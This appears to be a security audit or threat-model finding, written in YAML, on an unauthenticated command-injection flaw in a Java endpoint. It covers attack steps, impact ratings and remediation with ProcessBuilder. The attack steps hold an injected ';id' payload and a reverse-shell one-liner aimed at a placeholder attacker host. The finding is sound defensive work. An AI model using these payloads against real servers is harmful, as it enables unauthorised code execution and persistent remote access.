  title: OS Command Injection via sh -c (serverside/ToolController.java:18)
  scenario: An unauthenticated attacker passes a semicolon-delimited shell payload as the 'name' parameter to GET /api/tools/lookup;
    the server executes 'sh -c "echo Result for <name>"' where the shell splits on the semicolon and runs the attacker-supplied
    command under the JVM process identity, returning output in the JSON response.
  attack_steps:
  - Attacker sends GET /api/tools/lookup?name=;id to the endpoint; SecurityConfig.java:37 permits the request without any
    authentication.
  - Runtime.exec(['sh','-c','echo Result for ;id']) causes sh to split on ';' and execute 'id' as a second command.
  - JSON response body contains id output (uid, gid, groups), confirming arbitrary command execution as the JVM process user.
  - Attacker replaces id with a reverse-shell one-liner (e.g., bash -i >& /dev/tcp/attacker/4444 0>&1) to gain persistent
    interactive access.
  evidence_summary: ToolController.java:18 passes a string[] to Runtime.exec with 'sh','-c' and string-concatenates the raw
    user parameter into the shell command, giving sh unrestricted interpretation of attacker-supplied shell metacharacters.
  impact_description: Full OS-level code execution on the server under the JVM process user account; attacker can read/write
    any file accessible to the process, exfiltrate environment variables and secrets, and pivot to internal network services.
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: None
  actor_ids:
  - ACT-D-01
  - ACT-D-02
  primary_actor: ACT-D-01
  mitigation_title: Replace shell-invocation exec with parameterized ProcessBuilder without shell interpreter
  remediation:
    effort: Low
    steps:
    - Replace Runtime.getRuntime().exec(new String[]{"sh","-c","echo Result for "+name}) with ProcessBuilder(["echo","Result
      for",name]) so the shell is never involved and name is passed as a literal argument.
    - Add a security test asserting that name=';id' returns output containing the literal semicolon and does not execute id.
    code_example: null
    verification: Send GET /api/tools/lookup?name=;id and confirm the response output field contains the literal string 'Result
      for ;id' with no command output from id.
    reference: 'CWE-78: https://cwe.mitre.org/data/definitions/78.html'
